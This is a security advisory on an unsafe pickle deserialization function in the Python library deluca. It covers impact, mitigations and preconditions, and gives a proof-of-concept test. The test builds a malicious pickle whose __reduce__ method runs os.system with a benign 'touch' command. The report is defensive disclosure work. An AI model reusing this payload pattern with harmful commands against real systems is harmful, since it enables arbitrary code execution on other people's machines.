- Vulnerability Name: Pickle Deserialization Vulnerability
- Description:
    1. The `deluca.core.load` function is used to load Python objects from a file path. This function utilizes the `pickle.load` method for deserialization.
    2. An attacker can create a malicious pickle file containing arbitrary code.
    3. If an attacker can control or influence the `path` argument provided to the `deluca.core.load` function, they can point it to their malicious pickle file.
    4. When `deluca.core.load` is called with the attacker-controlled path, `pickle.load` deserializes the malicious object.
    5. During deserialization, the malicious code embedded within the pickle file is executed, leading to arbitrary code execution.
- Impact:
    - Arbitrary code execution on the system where the `deluca` library is used.
    - Full system compromise, including unauthorized access to data, system modifications, and potential data breaches.
    - In reinforcement learning systems, this could be exploited during model loading, potentially compromising the training process or deployed models.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The code directly uses `pickle.load` without any input validation or security measures.
- Missing Mitigations:
    - Replace `pickle` with a safer serialization format like JSON or Protocol Buffers, especially for loading data from potentially untrusted sources.
    - If `pickle` is necessary, implement strict input validation on the file path to ensure only trusted files are loaded from known safe locations. However, even with path validation, the risk of malicious content within pickled files remains high.
    - Consider using digital signatures or integrity checks to verify the authenticity and integrity of pickled files before loading.
- Preconditions:
    - Attacker can control or influence the file path argument passed to the `deluca.core.load` function. This could happen through various means, such as:
        - Configuration file injection if the path is read from a configuration.
        - Command injection if the path is constructed from user input in a command-line interface.
        - Social engineering to trick a user into loading a malicious file.
- Source Code Analysis:
    - File: `/code/deluca/core.py`
    ```python
    import pickle

    def load(path):
      return pickle.load(open(path, "rb"))
    ```
    - The `load` function directly calls `pickle.load(open(path, "rb"))`. This is inherently unsafe because `pickle.load` is known to be vulnerable to deserialization attacks when used with untrusted data. There is no input validation, sanitization, or any other security measure in place to prevent malicious pickle files from being loaded.
- Security Test Case:
    1. Create a malicious pickle file named `malicious.pkl` with the following Python code:
    ```python
    import pickle
    import os

    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, ('touch /tmp/deluca_pwned',))

    payload = MaliciousPayload()
    pickle.dump(payload, open('malicious.pkl', 'wb'))
    ```
    This code, when deserialized, will execute the command `touch /tmp/deluca_pwned`, creating an empty file named `deluca_pwned` in the `/tmp/` directory.
    2. Save the `malicious.pkl` file in the `/tmp/` directory.
    3. Create a Python script `test_exploit.py` with the following content:
    ```python
    from deluca.core import load

    malicious_file_path = '/tmp/malicious.pkl'
    load(malicious_file_path)
    ```
    4. Run the `test_exploit.py` script from your terminal: `python test_exploit.py`
    5. After running the script, check if the file `/tmp/deluca_pwned` exists. You can check this using the command `ls /tmp/deluca_pwned`.
    6. If the file `/tmp/deluca_pwned` exists, it confirms that the malicious code within `malicious.pkl` was executed when `deluca.core.load` was called, demonstrating the Pickle Deserialization Vulnerability.
